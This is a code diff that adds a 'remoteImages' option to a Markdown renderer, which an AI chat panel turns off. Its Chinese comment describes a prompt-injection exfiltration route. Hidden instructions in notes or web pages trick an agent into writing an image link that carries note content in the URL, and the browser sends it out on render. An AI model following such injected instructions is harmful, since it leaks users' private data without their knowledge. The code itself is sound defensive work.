@@ -85,6 +85,14 @@ export interface ExportOptions {
    * 免得两篇的一级标题在同一份 PDF 里平起平坐。
    */
   headingOffset?: number;
+  /**
+   * 外链图片（`![](https://…)`）照常加载吗。默认加载。
+   *
+   * AI 会话面板（§7.8）里要关掉：agent 读过的笔记、网页都可能藏着指令，
+   * 骗它写出一张 `![](https://某处/?q=笔记内容)` —— 渲染出来的那一刻，
+   * 浏览器就替它把内容送了出去，用户什么都没点。关掉时渲染成一行地址文字
+   */
+  remoteImages?: boolean;
 }
 
 interface Ctx {
@@ -718,6 +726,9 @@ function renderImage(ctx: Ctx, node: SyntaxNode): string {
   // 库内的相对路径要过 resolveImage 才变成 webview 能加载的地址；
   // 外链（https://…）它认不出来，退回原地址
   const resolved = ctx.opts.resolveImage?.(url) ?? null;
+  if (!resolved && ctx.opts.remoteImages === false) {
+    return `<span class="img-missing">${esc(`图片没有加载：${url}`)}</span>`;
+  }
   const src = resolved ?? safeHref(url);
   if (!src) return `<span class="img-missing">${esc(`找不到图片：${url}`)}</span>`;
 
